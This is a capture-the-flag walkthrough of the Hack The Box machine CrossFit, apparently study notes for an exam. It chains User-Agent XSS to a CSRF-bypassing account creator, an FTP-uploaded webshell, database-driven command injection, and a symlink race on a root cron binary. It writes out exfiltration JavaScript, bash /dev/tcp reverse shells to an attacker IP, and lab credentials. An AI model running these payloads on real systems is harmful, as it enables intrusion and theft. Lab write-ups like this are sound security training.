## Crosfitt

https://app.hackthebox.com/machines/CrossFit

### www-data

```
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

nmap returns this domain to us on the ftp port: \*.crossfit.htb.

Enumerating FTP, we find this subdomain on e-mail address: gym-club.crossfit.htb.
```
openssl s_client -connect 10.10.10.208:21 -starttls ftp
```

#### XSS

If we try a basic XSS at /blog-single.php, we get XSS detection.
![Pasted image 20240618133342](https://github.com/b1d0ws/OSWE/assets/58514930/a0ede2c8-d263-4aeb-9f82-1173333476a5)

Since browser information will be generated, we can inject XSS on User-Agent.
```bash
curl -s http://gym-club.crossfit.htb/blog-single.php --data 'name=0xdf&email=0xdf@crossfit.htb&phone=9999999999&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.2%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.2/"></script>'
```

We can catch this with nc to see more information and we see that the Referer is "http://gym-club.crossfit.htb/security_threat/report.php".

We can create a script to read this page.
```js
var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if(fetch_req.readyState == XMLHttpRequest.DONE) {
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("POST", "http://10.10.14.2:3000", false);
        exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
    }
};
fetch_req.open("GET", "http://gym-club.crossfit.htb/security_threat/report.php", false);
fetch_req.send();
```

Nothing interesting there.

<br>

We can enumerate subdomains with this:
```
wfuzz -u http://gym-club.crossfit.htb/ -H "Origin: http://FUZZ.crossfit.htb" --filter "r.headers.response ~ 'Access-Control-Allow-Origin'" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top
```

Basically we are trying to enumerate subdomains that has the CORS enabled searching for responses where we receive `Access-Control-Allow-Origin`. This indicates that the subdomain accepts cross communication coming from gym-club.

IppSec did like this:
```
ffuf -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top -u http://10.10.10.208 -H 'Origin: http://FUZZ.crossfit.htb' -mr 'Access-Control-Allow-Origin' -ignore-body
```

Doing this, we find ftp.crossfit.htb. From our machine, this returns apache default page, but it could be different from gym-club.

Replicate the XSS changing the domain.
```js
var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if(fetch_req.readyState == XMLHttpRequest.DONE) {
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("POST", "http://10.10.14.11:3000", false);
        exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
    }
};
fetch_req.open("GET", "http://ftp.crossfit.htb/", false);
fetch_req.send();
```

IppSec did like this to receive the content in GET parameter encoded in base64.
```js
var target = 'http://ftp.crossfit.htb/';
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send();

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.4/' + btoa(response), true);
req2.send();
```

We get this page source:
```html
<!DOCTYPE html>

<html>
<head>
    <title>FTP Hosting - Account Management</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
</head>
<body>

<br>
<div class="container">
        <div class="row">
        <div class="col-lg-12 margin-tb">
            <div class="pull-left">
                <h2>FTP Hosting - Account Management</h2>
            </div>
            <div class="pull-right">
                <a class="btn btn-success" href="http://ftp.crossfit.htb/accounts/create"> Create New Account</a>
            </div>
        </div>
    </div>
    <table class="table table-bordered">
        <tr>
            <th>No</th>
            <th>Username</th>
            <th>Creation Date</th>
            <th width="280px">Action</th>
        </tr>
    </table>
</div>
</body>
</html>
```

The link to `/accounts/create` is interesting. Getting this page:
```html
<form action="http://ftp.crossfit.htb/accounts" method="POST">
    <input type="hidden" name="_token" value="2kUXRzOMFY721Bppx9GnlMDpRKsc9CcX1qVzbD3H">
     <div class="row">
        <div class="col-xs-12 col-sm-12 col-md-12">
            <div class="form-group">
                <strong>Username:</strong>
                <input type="text" name="username" class="form-control" placeholder="Username">
            </div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12">
            <div class="form-group">
                <strong>Password:</strong>
                <input type="password" name="pass" class="form-control" placeholder="Password">
            </div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12 text-center">
                <button type="submit" class="btn btn-primary">Submit</button>
        </div>
    </div>

</form>
```

It is using a CSRF Token. \_token is characteristic from Laravel. This token is regenerated each time the session change, so we need to sent the request in a single session. To do that we can set `request.withCredentials = true;` in `XMLHttpRequest` object.

So, our script will:
1. Get page at /accounts/create
2. Find the CSRF token
3. Send a POST to /accounts with token, username and password
4. Post results back to our host

```js
function get_token(body) {
    var dom = new DOMParser().parseFromString(body, 'text/html');
    return dom.getElementsByName('_token')[0].value;
}


var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if (fetch_req.readyState == XMLHttpRequest.DONE) {
        var token = get_token(fetch_req.response);

        var reg_req = new XMLHttpRequest();
        reg_req.onreadystatechange = function() {
            if (reg_req.readyState == XMLHttpRequest.DONE) {
                var exfil_req = new XMLHttpRequest();
                exfil_req.open("POST", "http://10.10.14.2:3000/", false);
                exfil_req.send(reg_req.response);
            }
        };
        reg_req.open("POST", "http://ftp.crossfit.htb/accounts", false);
        reg_req.withCredentials = true;
        reg_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        reg_req.send("_token=" + token + "&username=bido&pass=bido12345");
    }
};

fetch_req.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
fetch_req.withCredentials = true;
fetch_req.send();
```

Other possibility
```js
req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function(){
	if(req.readyState == 4) {
		req2 = new XMLHttpRequest;
		req2.open('GET', 'http://10.10.14.2/' + btoa(this.responseText, false);
		req2.send();
		}
}
req.open('GET', 'http://ftp.crossfit.htb/accounts/create', false);
req.send();

regx = /token" value="(.*)"/g;
token = regx.exec(req.responseText)[1];

var params = '_token=' + token + '&username=jim&pass=test&submit=submit'
req.open('POST', "http://ftp.crossfit.htb/accounts", false);
req.setRequestHeader('Content-type', 'application/x-www-form-urleconded');
req.send(params);
```

IppSec version:
```js
var target = 'http://ftp.crossfit.htb/';
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.withCredentials = true;
req1.send();
var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, "text/html");
var token = doc.getElementsByName('_token')[-].value;

var req2 = new XMLHttpRequest();
var params = "username=ippsec&pass=PleaseSubscribe&_token= + token";
req2.open('POST', 'http://ftp.crossfit.htb/accounts', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(params);
var response2 = req2.responseText;
req2.send();

var req3 = new XMLHttpRequest();
req3.open('GET', 'http://10.10.14.4/' + btoa(response2), true);
req3.send();
```

Trigger XSS.
```bash
curl -s http://gym-club.crossfit.htb/blog-single.php --data 'name=bido&email=bido@crossfit.htb&phone=9999999999&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.2%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.2/ftp-create-account.js"></script>' | grep -i xss
```

<br>

#### FTP
Now we can login into FTP with this user, but we need to use lftp and disable SSL check.
```
lftp ftp.crossfit.htb -u bido
set ssl:verify-certificate false
```

It seems that we are inside /var/www/ since the directories are:
```
development-test
ftp
gym-club
html
```

Upload a webshell to development-test and execute it via XSS.
```ftp
put webshell.php
```

```js
var req = new XMLHttpRequest();
req.open("GET", "http://development-test.crossfit.htb/webshell.php?command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/443+0>%261'", false);
req.send()
```

```
curl -s http://gym-club.crossfit.htb/blog-single.php --data 'name=bido&email=bido@crossfit.htb&phone=9999999999&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.2%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.2/webshell.js"></script>' | grep -i xss

# You can trigger with a simple js file:
document.location = 'http://development-test.crossfit.htb/webshell.php';

# And create webshell.php with reverse shell instead of webshell
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'"); ?>
```

<br>

#### hank

We enumerate that the machines uses ansible in /etc/ansible and find a hash inside one the only playbook that exists: `/etc/ansible/playbooks/adduser_hank.yml`.

Cracking this hash.
```
hashcat -m 1800 hank.hash /usr/share/wordlists/rockyou.txt

$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/:powerpuffgirls
```

<br>

#### isaac
hank is member of admins group and this allows us to read what is inside `/home/isaac/send_updates/`.

This script is in `/etc/crontab` to run every minute as isaac:
```
isaac	/usr/bin/php /home/isaac/send_updates/send_updates.php
```

`send_updates.php` sends emails.
```php
<?php
/***************************************************
 * Send email updates to users in the mailing list *
 ***************************************************/
require("vendor/autoload.php");
require("includes/functions.php");
require("includes/db.php");
require("includes/config.php");
use mikehaertl\shellcommand\Command;

if($conn)
{
    $fs_iterator = new FilesystemIterator($msg_dir);

    foreach ($fs_iterator as $file_info)
    {
        if($file_info->isFile())
        {
            $full_path = $file_info->getPathname(); 
            $res = $conn->query('SELECT email FROM users');
            while($row = $res->fetch_array(MYSQLI_ASSOC))
            {
                $command = new Command('/usr/bin/mail');
                $command->addArg('-s', 'CrossFit Club Newsletter', $escape=true);
                $command->addArg($row['email'], $escape=true);

                $msg = file_get_contents($full_path);
                $command->setStdIn('test');
                $command->execute();
            }
        }
        unlink($full_path);
    }
}

cleanup();
?>
```

`composer.json` indicates a dependency that is vulnerable to command injection.
```
"mikehaertl/php-shellcommand": "1.6.0"
```

The script also reads a file, but we don't know where. Looking in /srv, there is a FTP directory that we can't access. Looking to FTP config (/etc/vsftpd.conf), we see this line:
```
user_config_dir=/etc/vsftpd/user_conf
```

Reading the file inside it, we see a user.
```
cat /etc/vsftpd/user_conf/ftpadm 
```

Also, we find how logins happen in /etc/pam.d/vsftpd and enumerate credentials - ftpadm:8W)}gpRJvAmnb
```
auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
```

This works in ftp and seems to contain the message directory.
```
lftp -u ftpadm ftp.crossfit.htb
```

You could find ftp credentials by using `grep ftpadm /etc -R` and looking the results.

<br>

#### users in DB
To exploit the command injection, we need to put the command injection into the email field.

We have the connection info in db.php:
```php
<?php
$dbhost = "localhost";
$dbuser = "crossfit";
$dbpass = "oeLoo~y2baeni";
$db = "crossfit";
$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
?>
```

Connecting:
```
mysql -u crossfit -poeLoo~y2baeni crossfit

# Users table is empty
select * from users;
```

Add a file inside the ftp directory and insert command injection.
```sql
insert into users(email) values('--wrong || touch /dev/shm/bido');

insert into users(email) values('--wrong || bash -c "bash -i &> /dev/tcp/10.10.14.2/443 0>&1"');
```

<br>

### Root Access
We can observe file events with pspy:
```bash
./pspy64 -f -r /usr/bin -r /bin -r /usr/local/bin
```

Something is accessing `dash` shell and then the binary `/bin/dbmsg`.

Reversing this binary with ghidra:
```c
void main(void)

{
  __uid_t uid;
  time_t time_seed;
  
  uid = geteuid();
  if (uid != 0) {
    fwrite("This program must be run as root.\n",1,0x22,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  time_seed = time((time_t *)0x0);
  srand((uint)time_seed);
  process_data();
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

It is checking if ID is root and exiting if not.

It calls srand to generate a random number and calls process_data.

This is process_data:
```c
void process_data(void)

{
  int query_ret;
  uint rand_num;
  long row0;
  undefined8 zip_error_str;
  size_t rand_plus_row0_len;
  undefined md5 [48];
  char rand_plus_row0 [48];
  char hash_path [48];
  undefined zip_error_str2 [28];
  uint errorp;
  long zip_src_file;
  FILE *f_hash_path;
  long *row;
  long zip_handle;
  long query_result;
  long mysql;
  
  mysql = mysql_init(0);
  if (mysql == 0) {
    fwrite("mysql_init() failed\n",1,0x14,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  row0 = mysql_real_connect(mysql,"localhost","crossfit","oeLoo~y2baeni","crossfit",0,0,0);
  if (row0 == 0) {
    exit_with_error(mysql);
  }
  query_ret = mysql_query(mysql,"SELECT * FROM messages");
  if (query_ret != 0) {
    exit_with_error(mysql);
  }
  query_result = mysql_store_result(mysql);
  if (query_result == 0) {
    exit_with_error(mysql);
  }
  zip_handle = zip_open("/var/backups/mariadb/comments.zip",1,&errorp);
  if (zip_handle != 0) {
    while (row = (long *)mysql_fetch_row(query_result), row != (long *)0x0) {
      if ((((*row != 0) && (row[1] != 0)) && (row[2] != 0)) && (row[3] != 0)) {
        row0 = *row;
        rand_num = rand();
        snprintf(rand_plus_row0,0x30,"%d%s",(ulong)rand_num,row0);
        rand_plus_row0_len = strlen(rand_plus_row0);
        md5sum(rand_plus_row0,(int)rand_plus_row0_len,(long)md5);
        snprintf(hash_path,0x30,"%s%s","/var/local/",md5);
        f_hash_path = fopen(hash_path,"w");
        if (f_hash_path != (FILE *)0x0) {
          fputs((char *)row[1],f_hash_path);
          fputc(0x20,f_hash_path);
          fputs((char *)row[3],f_hash_path);
          fputc(0x20,f_hash_path);
          fputs((char *)row[2],f_hash_path);
          fclose(f_hash_path);
          if (zip_handle != 0) {
            printf("Adding file %s\n",hash_path);
            zip_src_file = zip_source_file(zip_handle,hash_path,0);
            if (zip_src_file == 0) {
              zip_error_str = zip_strerror(zip_handle);
              fprintf(stderr,"%s\n",zip_error_str);
            }
            else {
              row0 = zip_file_add(zip_handle,md5,zip_src_file);
              if (row0 < 0) {
                zip_source_free(zip_src_file);
                zip_error_str = zip_strerror(zip_handle);
                fprintf(stderr,"%s\n",zip_error_str);
              }
              else {
                zip_error_str = zip_strerror(zip_handle);
                fprintf(stderr,"%s\n",zip_error_str);
              }
            }
          }
        }
      }
    }
    mysql_free_result(query_result);
    delete_rows(mysql);
    mysql_close(mysql);
    if (zip_handle != 0) {
      zip_close(zip_handle);
    }
    delete_files();
    return;
  }
  zip_error_init_with_code(zip_error_str2,(ulong)errorp,(ulong)errorp);
  zip_error_str = zip_error_strerror(zip_error_str2);
  fprintf(stderr,"%s\n",zip_error_str);
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

It queries the from from message table, then opens a zip file called `/var/backups/mariadb/comments.zip`.

The binary reverse is interesting, but this is overstudy to OSWE.

Program to predict the random number used by the binary:
```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>


int main() {

    time_t now = time(NULL);
    time_t next = now - (now % 60) + 61;
    printf("[*] Current timestamp:    %d\n", now);
    printf("[*] Next cron will be at: %d\n", next);

    srand(next);
    printf("[+] Randon num at next:   %d\n", rand());

    return 0;
}
```

Because we want to run on the Crossfit machine, we need to compile on it.
```bash
#/bin/bash

cat > /var/tmp/d.c <<'EOF'
#include <stdio.h>
#include <time.h>
#include <stdlib.h>


int main() {

    time_t now = time(NULL);
    time_t next = now - (now % 60) + 61;
    srand(next);
    printf("%d\n", rand());

    return 0;
}
EOF

echo '[*] Writing c code to get "random" int'
gcc -o /var/tmp/d /var/tmp/d.c
randint=$(/var/tmp/d)
echo "[+] Got random int: $randint"
echo "[*] Cleaning up code"
rm /var/tmp/d /var/tmp/d.c
```

Generate Symlink:
```bash
id=223
fn=$(echo -n "${randint}${id}" | md5sum | cut -d' ' -f1)
echo "[+] Filename will be: /var/local/$fn"
ln -s /root/.ssh/authorized_keys /var/local/$fn
echo "[+] Created symlink to /root/.ssh/authorized_keys"
```

Update Database.
```bash
ssh="ssh-ed25519"
key="AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d"
user="nobody@nothing"
echo "[*] Writing to DB: insert into messages(id, name, email, message) values ($id, '$ssh', '$user', '$key')"
mysql -u crossfit -poeLoo~y2baeni crossfit -e "insert into messages(id, name, email, message) values ($id, '$ssh', '$user', '$key')"
```

Wait and login if your key as root.

This is the [final script](https://0xdf.gitlab.io/files/crossfit-root.sh), created by 0xdf.
